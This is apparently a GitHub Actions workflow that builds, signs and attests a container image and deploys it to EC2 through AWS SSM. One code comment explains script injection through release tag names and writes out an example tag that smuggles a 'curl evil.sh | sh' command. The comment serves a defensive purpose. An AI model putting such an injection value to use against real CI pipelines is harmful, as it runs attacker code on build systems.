name: Deploy AWS App (EC2 Compose)

on:
  release:
    types: [published]
  workflow_dispatch:
    inputs:
      release_tag:
        description: 'Release tag to deploy (example: v0.1.0)'
        required: true
        type: string

permissions:
  id-token: write
  contents: read

concurrency:
  group: deploy-aws-prod-cv
  cancel-in-progress: false

jobs:
  build-and-push:
    name: Build + Push + Bundle
    runs-on: ubuntu-latest
    environment: production

    outputs:
      release_tag: ${{ steps.meta.outputs.release_tag }}
      image_tag: ${{ steps.meta.outputs.image_tag }}
      web_image: ${{ steps.images.outputs.web_image }}

    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6
        with:
          fetch-depth: 0
          ref: ${{ github.event_name == 'release' && github.ref || inputs.release_tag }}

      - name: Resolve release tag
        id: meta
        # Passed as environment variables, never interpolated into the
        # script. `${{ }}` is substituted into the script *text* before
        # bash runs, so a tag named `v1"; curl evil.sh | sh; x="` executes
        # — and the `tr` sanitisation below would run far too late to
        # help. As an env var the value is data, whatever it contains.
        env:
          EVENT_NAME: ${{ github.event_name }}
          RELEASE_TAG: ${{ github.event.release.tag_name }}
          INPUT_TAG: ${{ inputs.release_tag }}
        run: |
          set -euo pipefail
          if [ "$EVENT_NAME" = "release" ]; then
            raw_tag="$RELEASE_TAG"
          else
            raw_tag="$INPUT_TAG"
          fi

          if [ -z "$raw_tag" ]; then
            echo "Release tag is empty" >&2
            exit 1
          fi

          safe_tag="$(printf '%s' "$raw_tag" | tr '/:@ ' '-' | tr -cd '[:alnum:]._-')"
          if [ -z "$safe_tag" ]; then
            echo "Release tag '$raw_tag' became empty after sanitization" >&2
            exit 1
          fi

          echo "release_tag=$raw_tag" >> "$GITHUB_OUTPUT"
          echo "image_tag=$safe_tag" >> "$GITHUB_OUTPUT"

      - name: Validate required deploy variables
        env:
          AWS_REGION: ${{ vars.AWS_REGION }}
          AWS_ECR_WEB_REPOSITORY_URI: ${{ vars.AWS_ECR_WEB_REPOSITORY_URI }}
          AWS_DEPLOY_BUCKET: ${{ vars.AWS_DEPLOY_BUCKET }}
          AWS_DEPLOY_INSTANCE_ID: ${{ vars.AWS_DEPLOY_INSTANCE_ID }}
          AWS_SSM_APP_PREFIX: ${{ vars.AWS_SSM_APP_PREFIX }}
        run: |
          set -euo pipefail
          required=(
            AWS_REGION
            AWS_ECR_WEB_REPOSITORY_URI
            AWS_DEPLOY_BUCKET
            AWS_DEPLOY_INSTANCE_ID
            AWS_SSM_APP_PREFIX
          )
          for name in "${required[@]}"; do
            if [ -z "$(printenv "$name" || true)" ]; then
              echo "Missing GitHub environment variable: $name" >&2
              exit 1
            fi
          done

      - uses: aws-actions/configure-aws-credentials@cbe3b392738ccf3f987d68400dafcf4b0624a56c # v6
        with:
          aws-region: ${{ vars.AWS_REGION }}
          role-to-assume: ${{ secrets.AWS_DEPLOY_ROLE_ARN }}

      - uses: aws-actions/amazon-ecr-login@03f1aad4c6c7ffd436567f42f9384779290529bd # v2

      - name: Build + push web image
        id: images
        env:
          WEB_REPO: ${{ vars.AWS_ECR_WEB_REPOSITORY_URI }}
          IMAGE_TAG: ${{ steps.meta.outputs.image_tag }}
          RELEASE_TAG: ${{ steps.meta.outputs.release_tag }}
        run: |
          set -euo pipefail
          web_image="${WEB_REPO}:${IMAGE_TAG}"
          docker build \
            -f apps/ui/Dockerfile \
            --target prod \
            --build-arg NEXT_PUBLIC_RELEASE="${RELEASE_TAG}" \
            -t "$web_image" .
          docker push "$web_image"
          echo "web_image=$web_image" >> "$GITHUB_OUTPUT"

      # --- Supply-chain attestation -------------------------------------------
      #
      # The signature says "this image came from this repository's workflow";
      # the provenance says "and here is the commit, workflow and inputs that
      # produced it". Together they let a deploy refuse an image pushed by hand
      # or built from a branch nobody reviewed.
      #
      # Keyless: cosign gets a short-lived certificate from Fulcio bound to this
      # workflow's OIDC identity and records it in Rekor. No private key to
      # store, rotate or leak.
      - name: Install cosign
        uses: sigstore/cosign-installer@d58896d6a1865668819e1d91763c7751a165e159 # v3.9.2

      - name: Sign image (keyless)
        env:
          IMAGES: ${{ steps.images.outputs.web_image }}
        run: |
          for image in $IMAGES; do
            [ -n "$image" ] || continue
            # By digest, never by tag: a tag can be repointed after signing.
            digest="$(docker inspect --format='{{index .RepoDigests 0}}' "$image" 2>/dev/null || echo "$image")"
            cosign sign --yes "$digest"
            echo "signed: $digest"
          done

      - name: Attach SLSA provenance
        env:
          IMAGES: ${{ steps.images.outputs.web_image }}
          BUILD_REPO: ${{ github.repository }}
          BUILD_SHA: ${{ github.sha }}
          BUILD_REF: ${{ github.ref }}
          BUILD_RUN: ${{ github.run_id }}
        run: |
          cat > /tmp/provenance.json <<'JSON'
          {
            "buildType": "https://github.com/actions/runner"
          }
          JSON
          for image in $IMAGES; do
            [ -n "$image" ] || continue
            digest="$(docker inspect --format='{{index .RepoDigests 0}}' "$image" 2>/dev/null || echo "$image")"
            cosign attest --yes --predicate /tmp/provenance.json --type slsaprovenance "$digest"
            echo "attested: $digest"
          done

      - name: Bundle deploy artifacts to S3
        env:
          BUCKET: ${{ vars.AWS_DEPLOY_BUCKET }}
          IMAGE_TAG: ${{ steps.meta.outputs.image_tag }}
        run: |
          set -euo pipefail
          bundle_dir="$(mktemp -d)"
          cp docker/compose.app.prod.yml "$bundle_dir/"
          cp docker/.env.app.prod "$bundle_dir/"
          tar -czf bundle.tar.gz -C "$bundle_dir" .
          aws s3 cp bundle.tar.gz "s3://${BUCKET}/cv/${IMAGE_TAG}/bundle.tar.gz"

  deploy:
    name: Deploy to EC2
    needs: build-and-push
    runs-on: ubuntu-latest
    environment: production

    steps:
      - uses: aws-actions/configure-aws-credentials@cbe3b392738ccf3f987d68400dafcf4b0624a56c # v6
        with:
          aws-region: ${{ vars.AWS_REGION }}
          role-to-assume: ${{ secrets.AWS_DEPLOY_ROLE_ARN }}

      - name: Trigger remote deploy via SSM
        env:
          INSTANCE_ID: ${{ vars.AWS_DEPLOY_INSTANCE_ID }}
          BUCKET: ${{ vars.AWS_DEPLOY_BUCKET }}
          IMAGE_TAG: ${{ needs.build-and-push.outputs.image_tag }}
          WEB_IMAGE: ${{ needs.build-and-push.outputs.web_image }}
          SSM_APP_PREFIX: ${{ vars.AWS_SSM_APP_PREFIX }}
        run: |
          set -euo pipefail
          command_id="$(aws ssm send-command \
            --instance-ids "$INSTANCE_ID" \
            --document-name "AWS-RunShellScript" \
            --comment "Deploy cv ${IMAGE_TAG}" \
            --parameters commands="[\"bash /opt/platform/deploy-cv.sh '${BUCKET}' '${IMAGE_TAG}' '${WEB_IMAGE}' '${SSM_APP_PREFIX}'\"]" \
            --query 'Command.CommandId' --output text)"

          echo "SSM command: $command_id"
          aws ssm wait command-executed \
            --command-id "$command_id" \
            --instance-id "$INSTANCE_ID" || true

          status="$(aws ssm get-command-invocation \
            --command-id "$command_id" \
            --instance-id "$INSTANCE_ID" \
            --query 'Status' --output text)"

          aws ssm get-command-invocation \
            --command-id "$command_id" \
            --instance-id "$INSTANCE_ID" \
            --query 'StandardOutputContent' --output text

          if [ "$status" != "Success" ]; then
            aws ssm get-command-invocation \
              --command-id "$command_id" \
              --instance-id "$INSTANCE_ID" \
              --query 'StandardErrorContent' --output text >&2
            echo "Deploy failed with status: $status" >&2
            exit 1
          fi
